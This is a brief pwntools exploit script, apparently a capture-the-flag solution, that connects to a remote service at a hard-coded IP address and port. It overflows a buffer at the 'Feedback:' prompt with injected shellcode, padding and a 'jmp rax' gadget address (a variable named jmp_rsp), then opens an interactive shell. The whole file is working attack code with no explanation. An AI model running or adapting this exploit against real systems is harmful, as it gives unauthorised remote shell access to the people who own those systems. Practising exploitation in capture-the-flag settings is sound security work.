from pwn import *

exe = './pwn-3'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'
# sh = process(exe)
sh = remote('103.185.44.122', 25204)

padding = 120

rop = ROP(elf)
shellcode = asm(shellcraft.sh())
padd = padding - len (shellcode)
jmp_rsp = next(elf.search(asm('jmp rax')))
payload = flat([
    shellcode,
    b'A' * padd,
    p64(jmp_rsp)
])
sh.sendlineafter(b">> ", b'2')
sh.sendlineafter(b'Feedback: ', payload)
sh.interactive()
